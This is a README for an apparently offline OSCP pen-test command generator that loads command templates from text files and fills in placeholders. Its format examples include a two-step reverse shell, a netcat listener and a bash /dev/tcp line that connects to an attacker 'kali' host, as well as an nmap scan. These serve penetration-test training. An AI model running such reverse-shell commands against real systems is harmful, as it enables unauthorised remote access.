# OSCP Command Generator

A lightweight, offline-friendly command template browser + generator for
OSCP/pen-test workflows.

-   Load commands from simple `.txt` files in `/data`
-   Fill placeholders (e.g. `<target>`, `<user>`, `<password>`) from the
    left sidebar
-   Search instantly without re-render flicker (DOM hide/show filtering)
-   Filter by **Credential**, **Non-credential**, **Priority**, and
    **Favorites**
-   Copy full commands (or individual steps) with one click
-   Highlight placeholders, flags, operators, and `#comments` (but not
    numbering like `#2`)

------------------------------------------------------------------------

## 📁 Project Structure

    oscp-command-generator/
    ├─ index.html
    ├─ css/
    │  └─ style.css
    ├─ js/
    │  └─ (modular JS files)
    ├─ data/
    │  ├─ 01_Network_Enumeration.txt
    │  ├─ 02_Web_Enumeration_and_attacks.txt
    │  ├─ ...
    │  └─ manifest.json
    └─ README.md

> If using `manifest.json`, directory listing is NOT required.\
> If not using `manifest.json`, your server must allow directory listing
> for `/data/`.

------------------------------------------------------------------------

## 🚀 Getting Started

### Option A --- Quick run (recommended)

Use a tiny local server so `fetch()` works.

**Python**

``` bash
python -m http.server 8000
```

Open:

    http://localhost:8000/

**Node (http-server)**

``` bash
npx http-server -p 8000
```

### Option B --- VS Code Live Server

1.  Install "Live Server" extension\
2.  Right-click `index.html` → **Open with Live Server**

------------------------------------------------------------------------

## 📄 Command File Format (`/data/*.txt`)

Each non-empty line represents one command entry:

    Title: command here

### 🔺 Priority Commands

Prefix the line with `^`:

    ^Nmap quick scan: nmap -sC -sV <target>

If multiple lines share the same title, they are grouped into one card.

If ANY line in that group is marked `^`, the entire card becomes
Priority.

------------------------------------------------------------------------

### 🔢 Multi-step Commands (Automatic Grouping)

If the **same title appears multiple times**, the app merges them into
one card and treats them as multi-step:

    Reverse shell: nc -lvnp <kaliPort>
    Reverse shell: bash -i >& /dev/tcp/<kali>/<kaliPort> 0>&1

Displayed as:

-   Step 1
-   Step 2

Each step has its own copy button.

------------------------------------------------------------------------

### 💬 Comments Inside Commands

You can append contextual comments using `#`:

    Base64 transfer: base64 -d <filename2> > <filename1> #target-machine

-   `#target-machine` will be highlighted
-   `#2` (numbering) is NOT treated as a comment

------------------------------------------------------------------------

## ➕ Adding a New Category

1.  Create a new `.txt` file in `/data` Example:

```{=html}
<!-- -->
```
    14_Post_Exploitation.txt

2.  Add commands using the required format.

3.  Update `/data/manifest.json` (if used):

``` json
[
  "01_Network_Enumeration",
  "14_Post_Exploitation"
]
```

> ⚠️ Do NOT include `.txt` in manifest entries.

4.  Hard refresh browser (`Ctrl + Shift + R`).

------------------------------------------------------------------------

## ➖ Removing a Category

1.  Delete the `.txt` file from `/data`
2.  Remove its entry from `manifest.json`
3.  Refresh browser

------------------------------------------------------------------------

## 🔄 Regenerating `manifest.json`

If using `create.bat`, you can regenerate `manifest.json` automatically
from existing `.txt` files:

    create.bat

------------------------------------------------------------------------

## 🏷 Placeholders (Tags)

Supported placeholders:

-   `<target>` Target IPv4
-   `<target6>` Target IPv6
-   `<port>` Target Port
-   `<kali>` Kali IPv4
-   `<kali6>` Kali IPv6
-   `<kaliPort>` Kali Port
-   `<user>` Username
-   `<password>` Password
-   `<domain>` Domain
-   `<dc-ip>` Domain Controller IP
-   `<ntlm>` NTLM Hash
-   `<filename1>`, `<filename2>`
-   `<wordlist1>`, `<wordlist2>`

Open the **Help (?) button** to view all tags and click to focus their
input field.

------------------------------------------------------------------------

## 🔍 Filters

Buttons appear in this order:

1.  **Credential**
2.  **Non-credential**
3.  **Priority**
4.  **Favorites**

### Credential vs Non-credential

-   **Credential** = contains BOTH `<user>` and `<password>`
-   **Non-credential** = everything else
-   They are mutually exclusive
-   If neither selected → show all

------------------------------------------------------------------------

## ⭐ Favorites

-   Click `☆ / ★` to favorite
-   Stored in `localStorage`
-   Filter using the Favorites button

------------------------------------------------------------------------

## 🧪 Exam Controls

### Block Copy

When enabled: - Copy buttons are disabled if required placeholders are
empty

### Remember Non-sensitive Inputs

When enabled: - Stores IPs, ports, filenames, wordlists in
`localStorage` - Passwords are NOT stored

------------------------------------------------------------------------

## ⌨️ Keyboard Shortcuts

-   `/` → Focus search
-   `j` / `k` → Move selection
-   `c` → Copy selected card
-   `Ctrl + + / - / 0` → Font scaling
-   `Esc` → Close Help panel

> No hotkeys for favorite/priority to avoid typing conflicts.

------------------------------------------------------------------------

## ⚙️ Notes / Requirements

-   Must be served over `http://`
-   Fully static (no backend)
-   Works offline once loaded
-   Safe for GitHub Pages hosting

------------------------------------------------------------------------

## ✅ Unit Tests (core helpers)

From the project root:

```bash
node tests/run-tests.mjs
```

------------------------------------------------------------------------

## 📜 License

MIT (add `LICENSE` file to project root)
